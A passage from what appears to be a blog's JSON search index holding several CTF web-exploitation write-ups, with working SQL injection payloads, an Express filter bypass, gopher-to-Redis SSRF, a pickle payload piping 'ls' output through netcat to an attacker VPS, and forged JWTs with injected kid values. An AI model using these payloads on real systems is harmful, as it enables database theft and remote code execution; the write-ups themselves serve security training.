print(\u0026quot;INSERT INTO \u0026quot;+table_name+\u0026quot; (ip_id,url,detections,scanned_time) VALUES ('\u0026quot;+str(selected_ips[0]['id'])+\u0026quot;','\u0026quot;+url['URL']+\u0026quot;','\u0026quot;+url['Detections']+\u0026quot;','\u0026quot;+url['Scanned']+\u0026quot;')\u0026quot;) print(\u0026quot;EXCEPTION: \u0026quot;,e) self.resetSQL()  Exploitation So the idea is that if we go to VirusTotal website (https://www.virustotal.com/) and scan a url ,and then go back to our challenge website and scan the url\u0026rsquo;s ip we will find that the url we scanned in VirusTotal website will appear , it\u0026rsquo;s pretty confusing i know so let\u0026rsquo;s have an example\n We go to Virus Total website and scan for any url for example :( in my case i launched a web server on my VPS and used it here )   http://100.26.206.184/?u=Just testing for the writeup :p\n Now we go back to the challenge website and scan the ip address  Yeeees ! it\u0026rsquo;s appearing in the results so we now have the control over these values in the urls section of the results.\nNow here is our scenario , if we look to the vulnerable function persistURLs in VirusTotal.py we can notice the injection in this query (line 430)\n INSERT INTO \u0026ldquo;+table_name+\u0026rdquo; (ip_id,url,detections,scanned_time) VALUES ('\u0026ldquo;+str(selected_ips[0][\u0026lsquo;id\u0026rsquo;])+\u0026rdquo;','\u0026ldquo;+url[\u0026lsquo;URL\u0026rsquo;]+\u0026rdquo;','\u0026ldquo;+url[\u0026lsquo;Detections\u0026rsquo;]+\u0026rdquo;','\u0026ldquo;+url[\u0026lsquo;Scanned\u0026rsquo;]+\u0026rdquo;')\n We have control over the url[\u0026lsquo;URL\u0026rsquo;] parameter (the url we scan in VirusTotal Website) so it\u0026rsquo;s now an SQL injection in INSERT INTO values, but we have some constraints :\n The url encoding %20 that will be interpreted with the SQL query so we have to find another way in our payload instead of white spaces which is a well known bypass: /**/ The second thing faced me when i was solving the challenge , we can\u0026rsquo;t use \u0026ndash; - to equilibrate the SQL query so we will have to find a solution to equilibrate it  In order to test the injection locally i have created this small script that connects to my local DB and executes the same query, you can find it  HERE\nFinally I opted to this solution, here is the URL we will scan :\n http://100.26.206.184/?u=\u0026rsquo;,(select/**/1),(select/**/2)),(\u0026lsquo;102\u0026rsquo;,\u0026lsquo;a\n The complete SQL query that will be executed is :\n INSERT INTO detected_urls (ip_id,url,detections,scanned_time) VALUES (\u0026lsquo;2\u0026rsquo;,\u0026lsquo;100.26.206.184/?u=\u0026rsquo;,(select 1),(select 2)),(\u0026lsquo;102\u0026rsquo;,\u0026lsquo;a\u0026rsquo;,\u0026lsquo;15\u0026rsquo;,\u0026lsquo;yes\u0026rsquo;)\n Let\u0026rsquo;s try it now , we first scan it in VirusTotal :\nAnd now let\u0026rsquo;s scan the IP in the challenge website :\nIt\u0026rsquo;s fetched successfully, let\u0026rsquo;s scan the ip another time now to check if our injection succeeded or not, we must see 1,2 in the output :\nBingo ! our injection worked , we only have to dump the entire Database now and repeat the same procedure:\n Dump DB names :   http://100.26.206.184/?u=\u0026rsquo;,(select/**/gRoUp_cOncaT(0x7c,schema_name,0x7c)/**/fRoM/**/information_schema.schemata),(select/**/2)),(\u0026lsquo;102\u0026rsquo;,\u0026lsquo;a\n DBName : MySecretDatabase\nDump Tables and Columns :   http://100.26.206.184/?u=\u0026rsquo;,(select/**/gRoUp_cOncaT(0x7c,table_name,0x7c)/**/fRoM/**/information_schema.tables),(select/**/2)),(\u0026lsquo;102\u0026rsquo;,\u0026lsquo;a\n  http://100.26.206.184/?u=\u0026rsquo;,(select/**/gRoUp_cOncaT(0x7c,column_name,0x7c)/**/fRoM/**/information_schema.columns),(select/**/2)),(\u0026lsquo;103\u0026rsquo;,\u0026lsquo;a\n Table Name : SecretTable \u0026amp; Column Name : secret_value\nAnd finally let\u0026rsquo;s have our beloved flag :   http://100.26.206.184/?u=\u0026rsquo;,(select/**/group_concat(0x7c,secret_value,0x7c)/**/fRoM/**/MySecretDatabase.SecretTable),(select/**/2)),(\u0026lsquo;109\u0026rsquo;,\u0026lsquo;a\n Yees We did it , FLAG : Securinets{EmpireTotal_Pwn3D_fr0m_Th3_0th3r_S1de}\nI have really liked the idea of the challenge, it\u0026rsquo;s really creative , i want to thank Securinets technical team for these fun tasks and awesome CTF and of course the author @TheEmperors.\nI hope you liked the writeup if you have any questions don\u0026rsquo;t hesitate to contact me Twitter : @BelkahlaAhmed1 , finally i can sleep in peace after these 24 hours xd\n","date":1584748800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1584748800,"objectID":"5442b7b56fe4b087fc22ba29c9195065","permalink":"https://ahmed-belkahla.me/post/empire-total-securinetsquals20/","publishdate":"2020-03-21T00:00:00Z","relpermalink":"/post/empire-total-securinetsquals20/","section":"post","summary":"Empire Total (1000pts) (7 Solves) This task was really so creative and i had so fun solving it , but i can\u0026rsquo;t deny that it was painful :( after reading the description we can say that we aim to dump the database of the website (maybe SQL injection who knows) and fortunately we have the source code so let\u0026rsquo;s download it and begin our trip xD","tags":null,"title":"Empire Total - Securinets Quals 20","type":"post"},{"authors":null,"categories":null,"content":"A Peculiar Query (180pts) (73 Solves) I really liked this web task , we are given this web page that have a search functionality\nAnd we can read the source code\nconst express = require(\u0026quot;express\u0026quot;); const rateLimit = require(\u0026quot;express-rate-limit\u0026quot;); const app = express(); const { Pool, Client } = require(\u0026quot;pg\u0026quot;); const port = process.env.PORT || 9090; const path = require(\u0026quot;path\u0026quot;); const client = new Client({ user: process.env.DBUSER, host: process.env.DBHOST, database: process.env.DBNAME, password: process.env.DBPASS, port: process.env.DBPORT }); async function query(q) { const ret = await client.query(`SELECT name FROM Criminals WHERE name ILIKE '${q}%';`); return ret; } app.set(\u0026quot;view engine\u0026quot;, \u0026quot;ejs\u0026quot;); app.use(express.static(\u0026quot;public\u0026quot;)); app.get(\u0026quot;/src\u0026quot;, (req, res) =\u0026gt; { res.sendFile(path.join(__dirname, \u0026quot;index.js\u0026quot;)); }); app.get(\u0026quot;/\u0026quot;, async (req, res) =\u0026gt; { if (req.query.q) { try { let q = req.query.q; // no more table dropping for you let censored = false; for (let i = 0; i \u0026lt; q.length; i ++) { if (censored || \u0026quot;'-\\\u0026quot;.\u0026quot;.split``.some(v =\u0026gt; v == q[i])) { censored = true; q = q.slice(0, i) + \u0026quot;*\u0026quot; + q.slice(i + 1, q.length); } } q = q.substring(0, 80); const result = await query(q); res.render(\u0026quot;home\u0026quot;, {results: result.rows, err: \u0026quot;\u0026quot;}); } catch (err) { console.log(err); res.status(500); res.render(\u0026quot;home\u0026quot;, {results: [], err: \u0026quot;aight wtf stop breaking things\u0026quot;}); } } else { res.render(\u0026quot;home\u0026quot;, {results: [], err: \u0026quot;\u0026quot;}); } }); app.listen(port, function() { client.connect(); console.log(\u0026quot;App listening on port \u0026quot; + port); });  Overview It\u0026rsquo;s pretty obvious that we have an sql injection here ( we are concatenating the user input )\n const ret = await client.query(SELECT name FROM Criminals WHERE name ILIKE '${q}%';);\n But as we can see some filters are here :'( these characters are filtered : [',-,\u0026quot;,.] , after some tries i have figured that it will be impossible to bypass them so i started looking to some JS tricks. As we can see the filter function is looping over our input and checks if there are some prohibited characters and then it will replace them with \u0026ldquo;*\u0026rdquo; , For example if we type\n hello\u0026quot;or 1=1 \u0026ndash; -\n Our input will be changed to :\n hello************\n let q = req.query.q; let censored = false; for (let i = 0; i \u0026lt; q.length; i ++) { if (censored || \u0026quot;'-\\\u0026quot;.\u0026quot;.split``.some(v =\u0026gt; v == q[i])) { censored = true; q = q.slice(0, i) + \u0026quot;*\u0026quot; + q.slice(i + 1, q.length); } }  And finally it\u0026rsquo;s using substring function to limit our input\u0026rsquo;s length to 80 characters\nq = q.substring(0, 80); const result = await query(q); res.render(\u0026quot;home\u0026quot;, {results: result.rows, err: \u0026quot;\u0026quot;});  Hmmm everything seems okay nah ? but it\u0026rsquo;s a ctf web task we have to find some vulnerabilities ! let\u0026rsquo;s pass to how i did to solve it now, enough boring things\nExploitation The first thing i thinked about was http parameter pollution in express (read about it  HERE if you want ) ,briefly when we enter a get parameter multiple times express has a weird interpretation , it will process this parameter as an array for example here, if we pass this in the query :\n ?q=hello\u0026amp;q=allo\u0026amp;q=fword\n req.query.q will be parsed as an array [\u0026ldquo;hello\u0026rdquo;,\u0026ldquo;allo\u0026rdquo;,\u0026ldquo;fword\u0026rdquo;] , so if we go further when we will be iterating of q variable we will be comparing each array field with the filters for example, if we pass this query :\n q=\u0026quot;or 1=1 \u0026ndash; -\u0026amp;q=fword\n we will firstly compare \u0026ldquo;or 1=1 \u0026ndash; - and then the second field fword with these filtered chars [',-,\u0026quot;,.] , they are not equal ! , Youupi we can get our flag now as we passed the check .\nUnfortunately , it\u0026rsquo;s not that easy ,have you forgot the substring function ? an array has not a built in substring function so when we reach the substring part this will raise an error so we won\u0026rsquo;t execute the sql query :/ Javascript weird behaviour will save us this time ! if we do []+[] the result is a string , the sum of two arrays is a string so if we enter a \u0026quot; in one query parameter we will enter this part\ncensored = true; q = q.slice(0, i) + \u0026quot;*\u0026quot; + q.slice(i + 1, q.length);  and arrays have a built in slice function so the result of []+\u0026rdquo;*\u0026ldquo;+[] will be a string , we can now enter our payload with q=\u0026rsquo; in the end to ensure that our array will be a string when it reaches the substring part For example :\n q='or 1=1 \u0026ndash; -\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=\u0026rsquo;\n will let us pass !\nFILTERS BYPASSED SUCCESSFULLY\nTo test the number of q parameters and debug the app , i changed a little bit the source code and hosted the web app locally , you can find the modified source code  HERE if you want to test :D\nThe next part is pretty classic , a simple sql injection , we will first dump the columns name (we know the table name from the source code)\n q=%27union%20SELECT%20column_name%20FROM%20information_schema.columns%20\u0026ndash;%20-\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=%27\n and finally we find a column named crime so our final payload will be :\n HOST/?q=%27union%20SELECT%20crime%20FROM%20criminals%20\u0026ndash;%20-\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=%27\n And Congratulations ! I want to thank the organizers for this great CTF and fun tasks , i have really enjoyed participating\n","date":1584576000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1584576000,"objectID":"69529b563e3d5c941234b067b82bbb69","permalink":"https://ahmed-belkahla.me/post/angstromctf20/","publishdate":"2020-03-19T00:00:00Z","relpermalink":"/post/angstromctf20/","section":"post","summary":"A Peculiar Query (180pts) (73 Solves) I really liked this web task , we are given this web page that have a search functionality\nAnd we can read the source code","tags":null,"title":"Ã¥ngstrom CTF 2k20 - Web Exploitation","type":"post"},{"authors":null,"categories":null,"content":"Shinobis World (1000pts) (1 Solves) Hello guys again , in this task we are give the Settings.py of a django Web application , we can notice that the website is using caching with redis that is listening on port 6379 locally !\nOur first impression, we see an url fetcher that is curling websites which will be probably some SSRF , we try the usual payloads and we find that file ,localhost and 127.0.0.1 are filtered so we can use 127.0.1 and maybe http or gopher protocol , firstly let\u0026rsquo;s think , as we said we had a redis instance that is running on localhost , so may be using the ssrf we can interact with it\nin fact you can use gopher protocol to interact with redis :\n gopher://127.0.1:6379/_RedisCommandHERE\n for example to list all keys:\n  gopher://127.0.1:6379/_keys%20*\n  if we refresh the shinobis web page and then list all keys we can see some new keys that are set :\n :1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC\n :1:views.decorators.cache.cache_header..a906279c6f1b8c76747a8ba71e866d8c.en-us.UTC\n  If you read the Django Manual you will find that the caching system in django is a little bit different , first of all django will serialize the header and the rest of the page using pickle then it will cache them in the memory\nSo the idea is to forge our payload using pickle and the set the default key of django (:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC) with our payload , here is what will happen chronologically :\n Django will try to load the page so firstly he will check if the :1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC key is set if the key is set he will unpickle the data stored there and load the page using this content Our payload will be executed then Bingo we will have the flag :D  Final Payload :\n gopher://127.0.1:6379/aset%20:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC%20\u0026quot;cposix\\nsystem\\np0\\n(S\u0026rsquo;ls|nc YourVPSIP 1234\u0026rsquo;\\np1\\ntp2\\nRp3\\n.\u0026rdquo; This Payload will execute ls command and send it to our vps (don\u0026rsquo;t forget to refresh the Shinobis page because it\u0026rsquo;s the page that is being cached)\n Note: You can find the source code of this task in the source code repo of my github repo\nConclusion\nI hope that you liked the challenge , i tried to combine the SSRF with this default feature of django that can be used maliciously , it can be applied with any caching system (Memcached or Redis ..) If you have any questions dont forget to contact me and if you liked this writeup please star this repo :D\n","date":1579737600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1579737600,"objectID":"0115426ad15f4b3eb137669dff5b0d89","permalink":"https://ahmed-belkahla.me/post/shinobisworld/","publishdate":"2020-01-23T00:00:00Z","relpermalink":"/post/shinobisworld/","section":"post","summary":"Shinobis World (1000pts) (1 Solves) Hello guys again , in this task we are give the Settings.py of a django Web application , we can notice that the website is using caching with redis that is listening on port 6379 locally !","tags":null,"title":"Shinobis World - Web Exploitation NCSC 2.0 CTF","type":"post"},{"authors":null,"categories":null,"content":"JWT In a new way (1000pts) (0 Solves) And finally i\u0026rsquo;m writing a writeup for this task xD i published this task in Securinets Mini CTF and NCSC2.0_CTF but unfortunately it had 0 solves (in fact no one managed to pass the first step) , it took me a lot of time to prepare this task so i hope you enjoy it :D However bring your coffee cup and let\u0026rsquo;s begin the road . This Task has 3 steps , the first one is bypassing JWT token with a custom attack (not the regular ones) actually using an SQL injection in one of the token parameters , then we will have to exploit an ssrf to crypt the content of flag file (too much filters here haha)\n1st Step : JWT Bypass After visiting the link we have a simple web page with a sign in and sign up page ;\nSo after registering with random creds and signing in we check the cookies and as the task name refers we find a jwt token\nWe go as usual to the famous jwt.io to see the content of the token\nWe can try all the regular attacks but nothing will work , the kid value in the header is suspicious as we dont see it always in JWT tokens so after some googling we can conclude that the kid parameter is used when the jwt token is signed using multiple keys , each kid value refers to a different key (Example: kid:1 refers for ex to the key \u0026lsquo;blabla\u0026rsquo; and when we have kid:2 we are using a different key to sign the jwt token) Hmmm things are getting interesting here, we can suppose that the keys are fetched from a database maybe , let\u0026rsquo;s read again the description , we can notice a hint for SQL so maybe we have an SQL injection ? Let\u0026rsquo;s try to trigger an error by injecting this in the kid parameter\n ' UNION SELECT 2 \u0026ndash; -\n But Before you will have to fully understand how JWT tokens are forged, because there is no libraries that include the kid implementation so let\u0026rsquo;s take some notes here :\nAs we all know JWT token have 3 sections : Header + Payload + signature\nHeader : typically consists of two parts: the type of the token, which is JWT, and the signing algorithm being used, such as HMAC SHA256 or RSA but here we have also the kid part which is optional\nPayload : it contains statements about an entity (typically, the user) and additional data .\nSignature : Simply if we are using HS256 the sig is : Signature= HMACSHA256(BASE64URL(HEADER)+\u0026rsquo;.\u0026lsquo;+BASE64URL(PAYLOAD))\nBe careful it\u0026rsquo;s BASE64URL not a regular BASE64 you can read about it here : LINK\nNOTE: you can use the php function hash_hmac(\u0026lsquo;sha256\u0026rsquo;, $msg, $key, true) to sign the token\nso after forging the JWT token and replacing it we got this page !\nToken i used (i have used a random key for the signature) :\n eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIiAnIFVOSU9OIFNFTEVDVCAyIC0tIC0ifQ.eyJ1c2VyIjogImFhIiwidHlwZSI6ICJhZG1pbiJ9.xXh6UOMjm0YtgmiIsL6VExdDCLiUhIEF28kjv8UzWpo\n Hmmmmmmm an interesting message i think we are on a good path , now let\u0026rsquo;s think wisely , we have two paths now , the first one is to try to leak the keys with a blind SQL injection which is really painful especially if we face some filters and the second one which we will follow.\nWe will force the jwt token to use a key we provide to sign the token ; after some regular SQL injection tests we found that we had two columns which is expected (a column for the id and a column for the key ) we use this payload in the kid parameter\n \u0026lsquo;UNION SELECT 1,\u0026lsquo;kahla\u0026rsquo; \u0026ndash; -\n Thus the key will be forced to be kahla BUT we still get the annoying page \u0026ldquo;Here is your flag ! Just kidding \u0026quot; :'( (What an evil author 3:) )\nI think there are some filters here :'( Let\u0026rsquo;s try this payload in the kid parameter :\n \u0026lsquo;UNiOn SElEcT 1,\u0026lsquo;abc\u0026rsquo; \u0026ndash; -\n The final token used:\neyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIidVTmlPbiBTRWxFY1QgMSwnYWJjJyAtLSAtIn0.eyJ1c2VyIjogIiIsInR5cGUiOiAiYWRtaW4ifQ.3cOHXg1U7Mj_I3ag37oeg5KWJYA11T74bbD4NrcMC8A\nAnd yeeeeeeees we did it ! but WTF where is our flag ! we need to finish this step before\n2nd Step : SSRF + Decrypt It\u0026rsquo;s a web application that crypts a txt file and after some tries i figured that it only accepts urls that finish with .txt extension\nWe can all notice that it\u0026rsquo;s an ssrf but:\n file protocol is filtered we only can use http or https protocol localhost,127.0.0.1,127.0.1,the octal form of ip , and even ipv6 localhost address are filtered  Finally i used this payload that bypassed all the filters below :\n http://0x7f000001/flag.txt\n I used the hexadecimal format of local ip address :D\nAnd Bingo we have our flag but it\u0026rsquo;s encrypted If you check the source code you find a hint that leads us to visit robots.txt file and BINGO we find the crypting function\npublic static function cryptage($content){ $i=0; $words=array('kAHl4','$ecUriNets','Cha1m4','th4meUr','WhiT3HacK3Rs','Ani$Bo$$CoUldNtS0Lv31t'); $crypted=\u0026quot;\u0026quot;; for($i=0;$i\u0026lt;strlen($content);$i-=-pow(0,0)) { $ser=serialize(array($words[$i % 6],'securinets')); $key=intval(explode(\u0026quot;:\u0026quot;,explode(\u0026quot;;\u0026quot;,$ser)[1])[1]); $crypted=$crypted.chr(ord($content[$i])+$key) ; } return $crypted;  But it\u0026rsquo;s somehow a little bit obfuscated , however after digging here is the decrypt function\nfunction decryptage($content){ $i=0; $words=array('kAHl4','$ecUriNets','Cha1m4','th4meUr','WhiT3HacK3Rs','Ani$Bo$$CoUldNtS0Lv31t'); $decrypted=\u0026quot;\u0026quot;; for($i=0;$i\u0026lt;strlen($content);$i-=-pow(0,0)) { $ser=serialize(array($words[$i % 6],'securinets')); $key=intval(explode(\u0026quot;:\u0026quot;,explode(\u0026quot;;\u0026quot;,$ser)[1])[1]); $decrypted=$decrypted.chr(ord($content[$i])-$key) ; } return $decrypted ; } $cont=\u0026quot;eG9pfH5/c296eu+/vW01On1mP++/vTh4ZVt0SWRLe3tU77+9d2lJO1rvv71kXTZzYklkXk44MDcm77+9EA==\u0026quot; ; $con=base64_decode($cont); $res= decryptage($con); echo $res;  Executing this will give you the flag but with some unreadable characters (because of the non printable characters after crypting it) that\u0026rsquo;s why we can use curl in our cli and extract the crypted flag and save it or simply we can use a little python script that automates this and FINALLY we got The flag :\n securinets{W00w_3v3n_Th3_AutHor_C4Nt_S0lV3_TH1$!!}\n *** Conclusion ***\nI hope you liked this task , it took me 4 continuous days of hard work to implement this idea ( i had to write a big part of jwt generator ) you can find the source code in the same directory ! Anyways dont forget to star me and if you faced any problems please contact me!\n","date":1579651200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1579651200,"objectID":"90f4ce3510f102d8442ff6396cd36b56","permalink":"https://ahmed-belkahla.me/post/jwt-in-a-new-way/","publishdate":"2020-01-22T00:00:00Z","relpermalink":"/post/jwt-in-a-new-way/","section":"post","summary":"JWT In a new way (1000pts) (0 Solves) And finally i\u0026rsquo;m writing a writeup for this task xD i published this task in Securinets Mini CTF and NCSC2.0_CTF but unfortunately it had 0 solves (in fact no one managed to pass the first step) , it took me a lot of time to prepare this task so i hope you enjoy it :D However bring your coffee cup and let\u0026rsquo;s begin the road .","tags":null,"title":"JWT In A New Way - NCSC 2.0 CTF","type":"post"},{"authors":["Belkahla Ahmed"],"categories":["Cybersecurity"],"content":"","date":1566333101,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1566333101,"objectID":"fb9b05aa559be701b6dc5347a5bc3159","permalink":"https://ahmed-belkahla.me/project/networking-and-security/","publishdate":"2019-08-20T22:31:41+02:00","relpermalink":"/project/networking-and-security/","section":"project","summary":"These are some network and security related tools, including a keylogger, undetectable Backdoor, DNS/ARP spoofer and a file interceptor ","tags":["Cybersecurity"],"title":"Networking and Security Tools","type":"project"}]